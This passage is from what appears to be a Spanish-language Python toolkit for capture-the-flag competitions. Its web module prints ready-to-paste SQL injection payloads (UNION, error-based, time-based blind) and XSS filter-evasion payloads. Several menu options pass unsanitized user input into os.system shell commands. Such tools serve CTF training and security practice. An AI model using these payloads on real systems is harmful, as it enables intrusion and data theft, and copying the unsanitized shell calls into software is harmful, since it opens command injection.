    print(f"   -> Parámetro: {GREEN}{value}' ORDER BY 10 -- - {RESET} (Cambiar '10' hasta que falle para contar columnas)")
    print(f"   -> Parámetro: {GREEN}{value}' UNION SELECT 1,2,3,database(),user() -- - {RESET} (Asumiendo 5 columnas)")
    print(f"   -> Parámetro: {GREEN}{value}' UNION SELECT NULL,NULL,NULL,table_name,column_name FROM information_schema.columns -- - {RESET} (MySQL)")
    
    print(f"\n{BLUE}3. ERROR-BASED INJECTION (Volcar data en un mensaje de error):{RESET}")
    print(f"   💡 {YELLOW}OBJETIVO:{RESET} Forzar a la DB a imprimir información sensible en la respuesta HTTP.")
    print(f"   -> Parámetro: {GREEN}{value}' AND 1=CONVERT(int,@@version) -- {RESET} (MS SQL)")
    print(f"   -> Parámetro: {GREEN}{value}' AND extractvalue(0x0a,concat(0x0a,(select database())))-- {RESET} (MySQL)")
    
    print(f"\n{BLUE}4. TIME-BASED / BLIND (Si la página no muestra errores):{RESET}")
    print(f"   💡 {YELLOW}OBJETIVO:{RESET} Usar funciones de tiempo (SLEEP) para adivinar información binario a binario.")
    print(f"   -> Parámetro: {GREEN}{value}' AND IF(SUBSTRING(database(),1,1)='c', SLEEP(5), 1) -- - {RESET} (Si tarda 5 segundos, la DB empieza con 'c')")
    print(f"   -> Parámetro: {GREEN}{value}' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('A',10) -- {RESET} (Oracle - 10 segundos de espera)")
    
    print(f"\n{RED}💡 CONSEJO:{RESET} Usa Burp Suite Repeater o SQLmap para automatizar. Estos payloads son el punto de partida manual.")

def web_xss_payloads_list(url, param='input'):
    """Muestra una lista de payloads de XSS para copiar/pegar."""
    clear_screen()
    print(f"\n{YELLOW}═══ XSS PAYLOADS (MANUAL) ═══{RESET}\n")
    
    print(f"{MAGENTA}URL Base:{RESET} {url.split('?')[0]} | {CYAN}Parámetro:{RESET} {param}")
    
    print(f"\n{BLUE}1. BÁSICO / REFLECTED:{RESET}")
    print(f"   -> {urllib.parse.quote('<script>alert(1)</script>')}")
    print(f"   -> {urllib.parse.quote('<svg/onload=alert(document.domain)>')}")
    
    print(f"\n{BLUE}2. SIN ESPACIOS / ESCAPE DE TAGS:{RESET}")
    print(f"   -> {urllib.parse.quote('<img src=x onerror=alert(1)>')}")
    print(f"   -> {urllib.parse.quote('</textarea><script>alert(1)</script>')}")
    
    print(f"\n{BLUE}3. EVASIÓN DE FILTROS (Case-Insensitive):{RESET}")
    print(f"   -> {urllib.parse.quote('<sCrIpT>prompt(1)</sCrIpT>')}")
    print(f"   -> {urllib.parse.quote('<body onload=alert(1)>')}")
    
    print(f"\n{RED}💡 CONSEJO:{RESET} Copia el payload codificado y pégalo directamente en la URL/Parámetro.")


def web_menu():
    """Menú de Web Exploitation"""
    while True:
        clear_screen()
        print(f"\n{BLUE}{'═'*60}")
        print("WEB EXPLOITATION (Web)")
        print(f"{'═'*60}{RESET}")
        print("1. 🌐 HTTP/API Request (GET/POST)")
        print("2. 💉 SQL Injection Payloads (Manual)")
        print("3. 💬 XSS Payloads (Manual)")
        print("4. 🖼️  View Source (curl)")
        print("5. 🤖 Check robots.txt & sitemap.xml")
        print("9. ← Volver")
        
        choice = input(f"\n{CYAN}Opción: {RESET}").strip()
        
        if choice == '9':
            break
        
        if choice == '1':
            url = input("URL completa (ej: http://target/api): ").strip()
            method = input("Método (GET/POST, default GET): ").strip().upper() or 'GET'
            headers_str = input("Headers (JSON string, Enter para default): ").strip() or "{}"
            data_str = input("Data (JSON string/raw, Enter si no aplica): ").strip()
            
            headers = json.loads(headers_str) if headers_str.startswith('{') else {}
            data = json.loads(data_str) if data_str.startswith('{') else data_str
            
            web_http_request_analysis(url, method, headers, data)
        
        elif choice == '2':
            url = input("URL base con parámetro (ej: http://t/p?id=1): ").strip()
            if '?' not in url:
                 print(f"{RED}❌ Formato de URL incorrecto. Debe incluir un parámetro (ej: ?id=1).{RESET}")
                 input(f"\n{YELLOW}Presiona ENTER para volver...{RESET}")
                 continue
                 
            param = url.split('?')[1].split('=')[0]
            value = url.split('=')[1]
            web_sqli_payloads_list(url, param, value) # <--- Muestra la lista
            
        elif choice == '3':
            url = input("URL base con parámetro (ej: http://t/p?input=test): ").strip()
            if '?' not in url:
                 print(f"{RED}❌ Formato de URL incorrecto. Debe incluir un parámetro (ej: ?input=test).{RESET}")
                 input(f"\n{YELLOW}Presiona ENTER para volver...{RESET}")
                 continue
                 
            param = url.split('?')[1].split('=')[0]
            web_xss_payloads_list(url, param) # <--- Muestra la lista

        elif choice == '4':
            if not check_tool_availability('curl', 'Web'):
                input(f"\n{YELLOW}Presiona ENTER para volver...{RESET}")
                continue
            url = input("URL para ver el código fuente: ").strip()
            clear_screen()
            print(f"\n{YELLOW}═══ VIEW SOURCE (CURL) ═══{RESET}\n")
            os.system(f"curl -s {url} | head -30")
            
        elif choice == '5':
            if not check_tool_availability('curl', 'Web'):
                input(f"\n{YELLOW}Presiona ENTER para volver...{RESET}")
                continue
            url = input("URL base (ej: http://target.com): ").strip().rstrip('/')
            clear_screen()
            print(f"\n{YELLOW}═══ ROBOTS & SITEMAP CHECK ═══{RESET}\n")
            print(f"Robots.txt:")
            os.system(f"curl -s {url}/robots.txt")
            print(f"\nSitemap.xml:")
            os.system(f"curl -s {url}/sitemap.xml | head -10")
            
        input(f"\n{YELLOW}Presiona ENTER para volver al menú de Web...{RESET}")

# ═══════════════════════════════════════════════════════════════
# MÓDULO 7: HARDWARE 
# ═══════════════════════════════════════════════════════════════

def hardware_menu():
    """Menú de Hardware / IoT (Actualizado con checks)"""
    while True:
        clear_screen()
        print(f"\n{BLUE}{'═'*60}")
        print("HARDWARE & IOT")
        print(f"{'═'*60}{RESET}")
        print(f"1. 💾 Firmware Analysis (binwalk)")
        print(f"2. 📶 BLE/Bluetooth Scan (hcitool/bluetoothctl - Pendiente)")
        print(f"3. 📡 SDR/RF Analysis (Pendiente)")
        print("9. ← Volver")
        
        choice = input(f"\n{CYAN}Opción: {RESET}").strip()
        
        if choice == '9':
            break
            
        elif choice == '1':
            if not check_tool_availability('binwalk', 'Hardware'):
                input(f"\n{YELLOW}Presiona ENTER para volver...{RESET}")
                continue
            firmware_path = input("Ruta del firmware: ").strip()
            clear_screen()
            print(f"\n{YELLOW}═══ FIRMWARE ANALYSIS ═══{RESET}\n")
            os.system(f"binwalk -Me {firmware_path}")
            print(f"\n{GREEN}✅ Extracción completada. Revisa los archivos de output.{RESET}")
        
        elif choice in ['2', '3']:
            clear_screen()
            print(f"\n{RED}❌ Módulo Pendiente. Instalando herramientas como hcitool o Gqrx es necesario.{RESET}")

        input(f"\n{YELLOW}Presiona ENTER para volver al menú de Hardware...{RESET}")

# ═══════════════════════════════════════════════════════════════
# MÓDULO 8: CRYPTO 
# ═══════════════════════════════════════════════════════════════

def crypto_base64_decode(data):
    """Decodifica Base64, intentando saltar múltiples capas."""
    clear_screen()
    print(f"\n{YELLOW}═══ Base64 Decoder ═══{RESET}\n")
    try:
        decoded = data.encode('ascii')
        for i in range(5): # Intenta hasta 5 veces
            try:
                # Intenta decodificar con padding tolerante
                decoded = base64.b64decode(decoded, validate=True)
                print(f"{GREEN}✅ Nivel {i+1} Decodificado: {RESET}{decoded.decode('utf-8', errors='ignore')[:100]}...")
            except binascii.Error:
                print(f"{RED}❌ Falló la decodificación Base64 en el nivel {i+1}.{RESET}")
                break
            except UnicodeDecodeError:
                # Si es binario después de la decodificación, paramos
                print(f"{CYAN}⚠️ Data final parece ser binaria. Parando decodificación.{RESET}")
                break
        print(f"\n{MAGENTA}Output Final (Bytes): {RESET}{decoded}")
    except Exception as e:
        print(f"{RED}❌ Error general de decodificación: {e}{RESET}")

def crypto_hashing(data):
    """Calcula hashes comunes."""
    clear_screen()
    print(f"\n{YELLOW}═══ Hashing Tool ═══{RESET}\n")
    print(f"{MAGENTA}Input:{RESET} {data[:50]}...")
    
    encoded_data = data.encode('utf-8')
    
    # MD5
    md5_hash = hashlib.md5(encoded_data).hexdigest()
    print(f"MD5: {md5_hash}")

    # SHA1
    sha1_hash = hashlib.sha1(encoded_data).hexdigest()
    print(f"SHA1: {sha1_hash}")

    # SHA256
    sha256_hash = hashlib.sha256(encoded_data).hexdigest()
    print(f"SHA256: {sha256_hash}")
    
def crypto_url_encoding(data, mode):
    """Codifica o decodifica URL (percent encoding)."""
    clear_screen()
    if mode == 'encode':
        result = urllib.parse.quote(data)
        print(f"{YELLOW}═══ URL Encoder ═══{RESET}")
        print(f"Encoded: {GREEN}{result}{RESET}")
    elif mode == 'decode':
        result = urllib.parse.unquote(data)
        print(f"{YELLOW}═══ URL Decoder ═══{RESET}")
        print(f"Decoded: {GREEN}{result}{RESET}")

def crypto_rot13(data):
    """Aplica ROT13 (ROT Cifrado simple)"""
    clear_screen()
    print(f"\n{YELLOW}═══ ROT13 Cipher ═══{RESET}\n")
    
    # Crear la tabla de traducción para ROT13
    rot_map = str.maketrans(
        'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
        'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'
    )
    result = data.translate(rot_map)
    
    print(f"{MAGENTA}Input:{RESET} {data}")
    print(f"{GREEN}Output:{RESET} {result}")


def crypto_menu():
    """Menú de Criptografía"""
    while True:
        clear_screen()
        print(f"\n{BLUE}{'═'*60}")
        print("CRYPTO & ENCODING")
        print(f"{'═'*60}{RESET}")
        print("1. 🗝️  Base64 Decode (Multi-Layer)")
        print("2. 🔐 Hashing (MD5, SHA1, SHA256)")
        print("3. 🔄 ROT13 (ROT Cifrado simple)") 
        print("4. 🌐 URL/Percent Encoding")
        print("5. 🌐 URL/Percent Decoding")
        print("9. ← Volver")
        
        choice = input(f"\n{CYAN}Opción: {RESET}").strip()
        
        if choice == '9':
            break
        
        if choice == '1':
            data = input("Data Base64: ").strip()
            crypto_base64_decode(data)
        elif choice == '2':
            data = input("Data para hash: ").strip()
            crypto_hashing(data)
        elif choice == '3': 
            data = input("Data para ROT13: ").strip()
            crypto_rot13(data)
        elif choice == '4':
            data = input("Data para URL Encode: ").strip()
            crypto_url_encoding(data, 'encode')
        elif choice == '5':
            data = input("Data para URL Decode: ").strip()
            crypto_url_encoding(data, 'decode')
        
        input(f"\n{YELLOW}Presiona ENTER para volver al menú de Crypto...{RESET}")

# ═══════════════════════════════════════════════════════════════
# MENÚ PRINCIPAL (Final)
# ═══════════════════════════════════════════════════════════════

def main_menu():
    """Menú principal con todas las categorías"""
    while True:
        clear_screen()
        print(f"\n{GREEN}{'═'*60}")
        print(" CTF COMPLETE TOOLKIT - Versión 6.3")
        print(f"{'═'*60}{RESET}")
        print(f"{MAGENTA}1. 💻 REVERSING{RESET} - Binary analysis, disassembly")
        print(f"{RED}2. 💥 PWN{RESET} - Binary exploitation, ROP")
        print(f"{CYAN}3. 🔍 FORENSICS{RESET} - File analysis, memory dumps")
        print(f"{YELLOW}4. 🖼️  STEGANOGRAPHY{RESET} - Hidden data in files")
        print(f"{BLUE}5. 🌐 OSINT{RESET} - Open source intelligence")
        print(f"{GREEN}6. 🌐 WEB{RESET} - SQL injection, XSS, HTTP requests")
        print(f"{MAGENTA}7. 🔧 HARDWARE{RESET} - Firmware, IoT, RF {MAGENTA}(WIP){RESET}")
        print(f"{CYAN}8. 🔐 CRYPTO{RESET} - Encoding, hashing, ciphers")
        print("0. ❌ Salir")
        
        choice = input(f"\n{CYAN}Categoría: {RESET}").strip()
        
        if choice == '1':
            reversing_menu()
        elif choice == '2':
            pwn_menu()
        elif choice == '3':
            forensics_menu()
        elif choice == '4':
            stego_menu()
        elif choice == '5':
            osint_menu()
        elif choice == '6':
            web_menu()
        elif choice == '7':
            hardware_menu()
        elif choice == '8':
            crypto_menu()
        elif choice == '0':
            clear_screen()
            print(f"\n{GREEN}¡Suerte en el CTF!{RESET}\n")
            break

if __name__ == '__main__':
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n\n{YELLOW}Saliendo...{RESET}\n")
        sys.exit(0)
